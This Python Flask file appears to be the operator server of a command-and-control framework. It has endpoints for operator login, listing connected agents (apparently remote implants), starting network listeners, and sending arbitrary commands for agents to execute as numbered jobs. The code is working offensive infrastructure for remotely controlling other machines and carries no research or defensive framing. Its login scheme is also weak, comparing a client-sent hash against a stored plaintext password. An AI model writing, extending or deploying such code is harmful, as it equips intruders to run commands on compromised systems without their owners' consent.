from lib.vglobals.servercfg import *
from lib.vglobals.sharedvars import *
from lib.globals import refresh_available_listeners, listeners_available

from hadler import BUFFER, run as handler_run
from lib.sthread import Sthread

from flask import Flask, request, jsonify
from hashlib import sha256
from uuid import uuid4

import json

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
    if request.json is None:
        return "JSON body is none", 500

    username: str = request.json["username"]
    password: str = request.json["password"]

    if not username in WHITELIST:
        return "Invalid username", 401

    orginal_password = sha256(
        WHITELIST[username].encode()).hexdigest()

    if password != orginal_password:
        return "Invalid password", 401

    session_uuid = uuid4().hex

    clients_session[username] = session_uuid

    return jsonify({"session": session_uuid, "wsaddr": "ws://{}:{}".format(WEBSOCKET_SERVER_IP, WEBSOCKET_SERVER_PORT)})


@app.route("/get_agents/<session>")
def get_agents(session: str):
    agents_row = []

    if not session in list(clients_session.values()):
        return "Invalid session ID", 401

    for agent in agents:
        addr = agents[agent].addr
        agents_row.append([agent, addr])

    return jsonify(agents_row)


@app.route("/add_listener", methods=["POST"])
def add_listener():
    if request.json is None:
        return "JSON body is none", 500

    session: str = request.json["auth"]

    if not session in list(clients_session.values()):
        return "Invalid session ID", 401

    listener_type = request.json["type"]

    refresh_available_listeners()
    if not listener_type in listeners_available:
        return "Invalid listener type", 403

    listener_name: str = request.json["name"]
    listener_ip: str = request.json["ip"]
    listener_port: str = request.json["port"]

    listeners[listener_name] = {"ip": listener_ip, "port": listener_port, "type": listener_type}

    listener_thread = Sthread(target=handler_run, args=(
        listener_ip, listener_port, listener_type))

    listeners_threads[listener_name] = listener_thread

    return jsonify(True)

@app.route("/get_listeners/<session>")
def get_listeners(session: str):
    listeners_row = []

    if not session in list(clients_session.values()):
        return "Invalid session ID", 401

    for listener_name in listeners:
        listener = listeners[listener_name]
        
        ip = listener["ip"]
        port = listener["port"]
        type = listener["type"]
        listeners_row.append([listener_name, ip, port, type])

    return jsonify(listeners_row)

@app.route("/send_command", methods=["POST"])
def send_command(): # TODO: send output to client 
    if request.json is None:
        return "JSON body is none", 500

    session: str = request.json["auth"]

    if not session in list(clients_session.values()):
        return "Invalid session ID", 401
    
    target_id: str = request.json["target"]
    command: str = request.json["cmd"]

    if not target_id in list(agents.keys()):
        return "Agent not found", 500
    
    agent = agents[target_id]

    job_n = len(jobs.keys()) + 1

    agent.send(json.dumps({"exec": command, "job": job_n}).encode())

    jobs[job_n] = None
    
    return jsonify({"job": job_n})

# TODO: Websocket chat

def run(ip: str, port: int, ssl=False, ssl_context=()):
    if ssl:
        app.run(ip, port, ssl_context=ssl_context)
    else:
        app.run(ip, port)
